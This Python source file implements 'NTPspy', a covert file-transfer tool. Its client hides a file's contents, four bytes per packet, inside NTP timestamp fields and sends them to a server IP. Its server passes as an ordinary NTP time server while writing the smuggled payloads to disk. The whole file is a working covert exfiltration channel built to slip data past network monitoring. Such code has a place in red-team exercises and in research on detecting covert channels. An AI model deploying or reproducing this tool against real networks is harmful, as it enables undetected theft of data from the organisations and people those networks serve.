import socket
import struct
import argparse
import time
import os
from weakref import ref

DEFAULT_NTP_PORT = 123
DEFAULT_MAGIC_NUMBER = 0xDEADBEEF  # default magic number
NTPSPY_VERSION = 0x01

# NTP packet format (48 bytes)
# length (bits), field name, special purpose/values
# 2, LI, 0x3 = fatal error
# 3, VN, 0x3 = NTPv3
# 3, Mode, 0x4 = server mode, 0x3 = client mode
# 8, Stratum, 0xF = server mode, 0x10 = client mode
# 8, Poll = NTPspy opcode, 0x0 query NTPspy version, 0x1 transfer file
# 8, Precision, NTPspy protocol version
# 16, Root Delay, NTPspy magic number
# 16, Root Dispersion, (reserved)
# 32, Reference ID, transfer session ID
# 32, Reference Timestamp, [0:31] seconds, [32:63] payload sequence number
# 32, Originate Timestamp, [0:31] seconds, [32:63] hidden payload data
# 32, Receive Timestamp, normal NTP timestamp
# 32, Transmit Timestamp, normal NTP timestamp

class NTPServer:
    def __init__(self, port, storage_path, magic_number, verbose):
        self.port = port
        self.storage_path = storage_path
        self.magic_number = magic_number
        self.verbose = verbose

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("", self.port))
        if self.verbose:
            print(f"NTP Server listening on port {self.port}, storing files in {self.storage_path}")
        
        while True:
            data, addr = sock.recvfrom(48)
            
            request_magic_number = struct.unpack("!I", data[4:8])[0]
            is_ntpspy = request_magic_number == self.magic_number
            request_type = "NTPspy Traffic" if is_ntpspy else "Ordinary NTP Request"
            
            if self.verbose:
                print(f"Received request from {addr}, type: {request_type}")
            
            if is_ntpspy:
                response = self.handle_ntpspy(data)
            else:
                response = self.handle_normal_ntp(data)
            
            sock.sendto(response, addr)

    def handle_normal_ntp(self, data):
        recv_timestamp = time.time()
        ntp_timestamp = int(recv_timestamp) + 2208988800  # UNIX to NTP 
        fractional = int((recv_timestamp % 1) * (2**32))
        
        if self.verbose:
            print(f"Received request, type: Ordinary NTP, timestamp: {recv_timestamp}")
        
        response = struct.pack(
            "!B B B B 11I",
            0x1C,  # LI=0, Version=3, Mode=4 (server)
            15, 0, 0,  # Stratum 15, Poll, Precision
            0, 0,  # Root Delay, Root Dispersion
            0,  # Reference ID
            ntp_timestamp, fractional,  # Reference Timestamp
            ntp_timestamp, fractional,  # Originate Timestamp
            ntp_timestamp, fractional,  # Receive Timestamp
            ntp_timestamp, fractional   # Transmit Timestamp
        )
        
        if self.verbose:
            print(f"Sent response, type: Ordinary NTP, timestamp: {recv_timestamp}")
        
        return response

    def handle_ntpspy(self, data):
        # extract ntp fields
        li_vn_mode, stratum, poll, precision, root_delay, root_dispersion, reference_id, \
        ref_timestamp_sec, ref_timestamp_frac, orig_timestamp_sec, orig_timestamp_frac, \
        recv_timestamp_sec, recv_timestamp_frac, trans_timestamp_sec, trans_timestamp_frac = struct.unpack("!B B B B I I I I I I I I I I I", data)

        li = (li_vn_mode >> 6) & 0x3
        vn = (li_vn_mode >> 3) & 0x7
        mode = li_vn_mode & 0x7
        opcode = poll
        session_id = reference_id
        sequence_number = ref_timestamp_frac
        payload = orig_timestamp_frac
        function = "query" if opcode == 0x0 else "transfer file"
        
        if self.verbose:
            print(f"Received request, type: NTPspy, function: {function}")
        
        if opcode == 0x1:
            filename = os.path.join(self.storage_path, f"{session_id}.dat")
            with open(filename, "ab") as f:
                f.write(payload.to_bytes(4, byteorder='big'))
            if self.verbose:
                print(f"Appended payload to file {filename}")

        # regular NTP response with current time
        recv_timestamp = time.time()
        ntp_timestamp = int(recv_timestamp) + 2208988800  # UNIX to NTP 
        fractional = 0 # reserved 
        root_delay = self.magic_number
        precision = NTPSPY_VERSION
        
        response = struct.pack(
            "!B B B B 11I",
            0x1C,  # LI=0, Version=3, Mode=4 (server)
            15, opcode, precision,  # Stratum 15 = server mode, poll = opcode, precision = protocol version
            root_delay, 0,  # root Delay, root dispersion
            session_id,  # reference ID field
            ref_timestamp_sec, ref_timestamp_frac,  # Reference Timestamp
            orig_timestamp_sec, orig_timestamp_frac,  # Originate Timestamp
            ntp_timestamp, fractional,  # Receive Timestamp
            ntp_timestamp, fractional   # Transmit Timestamp
        )
        
        if self.verbose:
            print(f"Sent response, function: {function}, value: {precision}")
        
        return response

class NTPClient:
    def __init__(self, server_ip, port, filename, magic_number, verbose, session_id):
        self.server_ip = server_ip
        self.port = port
        self.filename = filename
        self.magic_number = magic_number
        self.verbose = verbose
        self.session_id = session_id

    def query_server(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        ntp_timestamp = int(time.time()) + 2208988800  # Convert UNIX to NTP epoch
        fractional = 0  # reserved
        
        request = struct.pack(
            "!B B B B 11I",
            0x1B,  # LI=0, Version=3, Mode=3 (client)
            16, 0, NTPSPY_VERSION,  # Stratum 16, Poll, Precision
            self.magic_number, 0,  # Root Delay, Root Dispersion (using magic number)
            0,  # Reference ID
            ntp_timestamp, fractional,  # Reference Timestamp
            ntp_timestamp, fractional,  # Originate Timestamp
            ntp_timestamp, fractional,  # Receive Timestamp
            ntp_timestamp, fractional   # Transmit Timestamp
        )
        
        sock.sendto(request, (self.server_ip, self.port))
        if self.verbose:
            print(f"Sent NTPspy query to {self.server_ip}:{self.port}")
        
        response, _ = sock.recvfrom(48)
        if self.verbose:
            print("Received NTP response")
        
        # unpack response
        _, _, _, precision, *_ = struct.unpack("!B B B B 11I", response)
        
        if precision == NTPSPY_VERSION:
            print(f"NTPspy server detected with protocol version {precision}")
        else:
            print("Not NTPspy server or protocol version mismatch")
        
        return precision == NTPSPY_VERSION

    def send_request(self):
        if not self.query_server():
            return
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        with open(self.filename, "rb") as f:
            sequence_number = 0
            while True:
                segment = f.read(4)
                if not segment:
                    break
                
                # session ID to integer
                session_id_int = int.from_bytes(self.session_id.encode(), 'big')
                
                # segment to integer
                payload = int.from_bytes(segment, 'big')
                
                ntp_timestamp = int(time.time()) + 2208988800  # Convert UNIX to NTP epoch
                fractional = 0  # Placeholder for now
                
                request = struct.pack(
                    "!B B B B 11I",
                    0x1B,  # LI=0, Version=3, Mode=3 (client)
                    16, 0x1, NTPSPY_VERSION,  # Stratum 16, Poll = opcode, Precision = protocol version
                    self.magic_number, 0,  # Root Delay = magic number, Root Dispersion = reserved
                    session_id_int,  # Reference ID
                    ntp_timestamp, sequence_number,  # Reference Timestamp
                    ntp_timestamp, payload,  # Originate Timestamp
                    ntp_timestamp, fractional,  # Receive Timestamp
                    ntp_timestamp, fractional   # Transmit Timestamp
                )
                
                sock.sendto(request, (self.server_ip, self.port))
                if self.verbose:
                    print(f"Sent NTPspy packet to {self.server_ip}:{self.port}, sequence_number: {sequence_number}, payload: {payload}")
                
                response, _ = sock.recvfrom(48)
                if self.verbose:
                    print("Received NTP response")
                
                sequence_number += 1

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NTPspy - Covert NTP-based file transfer")
    parser.add_argument("-s", action="store_true", help="Run as server")
    parser.add_argument("-p", type=int, default=DEFAULT_NTP_PORT, help="Port number")
    parser.add_argument("-m", type=int, default=DEFAULT_MAGIC_NUMBER, help="Magic number")
    parser.add_argument("-v", action="store_true", help="Verbose mode")
    parser.add_argument("path_or_ip", help="Storage path (server) or server IP (client)")
    parser.add_argument("filename", nargs="?", help="Filename to transfer (client)")
    parser.add_argument("-q", action="store_true", help="Query server for NTPspy protocol version")
    parser.add_argument("-d", type=str, help="Transfer session ID (alphanumeric, max length 4 characters)")

    args = parser.parse_args()
    if args.d and (not args.d.isalnum() or len(args.d) > 4):
        parser.error("session ID must be alphanumeric, length <= 4")

    if args.s:
        # server mode
        storage_path = args.path_or_ip if os.path.isdir(args.path_or_ip) else os.getcwd()
        server = NTPServer(args.p, storage_path, args.m, args.v)
        server.start()
    else:
        # client mode
        if not args.filename:
            parser.error("client mode requires a filename to transfer")
        client = NTPClient(args.path_or_ip, args.p, args.filename, args.m, args.v, args.d or "")
        if args.q:
            client.query_server()
        else:
            client.send_request()